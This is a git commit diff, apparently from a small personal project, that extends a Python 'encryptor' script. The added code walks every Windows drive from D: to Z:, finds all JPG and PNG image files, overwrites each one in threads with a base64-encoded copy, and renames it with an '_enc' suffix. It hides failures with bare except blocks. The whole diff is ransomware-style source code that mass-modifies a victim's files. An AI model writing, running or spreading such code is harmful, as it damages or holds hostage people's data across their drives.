4fc8e66d745b41d239696f614a3d4e7d47e8aea8
Shubham Vishwakarma <43336210+Shubhamvis98@users.noreply.github.com>
2020-07-10 19:46:57 +0530

    Update encryptor.py
    added threading

--- encryptor.py
+++ encryptor.py
@@ -1,20 +1,54 @@
 import base64
+import sys, os
+from threading import Thread as thread
 from os import rename as rn
+from os import system as cmd
 
+# clear screen
+if os.name == 'nt':
+    cmd('cls')
+else:
+    cmd('clear')
+
+# encryptor
 def enc(file):
     # Encrypt
-    with open(file, 'rb',) as img:
-        cp = img.read()
-        img.close()
-        b64=base64.b64encode(cp)
-        enc=b64.decode('ascii')
+    try:
+        with open(file, 'rb',) as img:
+            cp = img.read()
+            img.close()
+            b64=base64.b64encode(cp)
+            enc=b64.decode('ascii')
+    except:
+        print("[!] Error while openning file...", file)
 
     # Write to file
-    with open(file, 'w') as eimg:
-        eimg.write(enc)
-        rn(file, file + '_enc')
+    try:
+        with open(file, 'w') as eimg:
+            eimg.write(enc)
+            eimg.close()
+            rn(file, file + '_enc')
+    except:
+        print("[!] Permission Error...", file)
+# --END--
 
-# File to encrypt
-file = 'enc.jpg'
+def driverun(root):
+    for ROOT, DIR, FILE in os.walk(root, topdown=False):
+        for name in FILE:
+            PATH = os.path.join(ROOT, name)
+            ext = PATH.split('.')[-1]
+            if ext.lower() == 'jpg' or ext.lower() == 'jpeg' or ext.lower() == 'png':
+                print(PATH)
+                #enc(PATH)
+                thread(target=enc, args=(PATH,)).start()
+        for name in DIR:
+            PATH = os.path.join(ROOT, name)
+            #operations with direstories
 
-enc(file)
+dr = [chr(i) for i in range(ord('D'), ord('Z')+1)]
+drives = [d+':\\' for d in dr if os.path.exists(f'{d}:')]
+
+for i in drives:
+    #driverun(i)
+    thread(target=driverun, args=(i,)).start()
+    
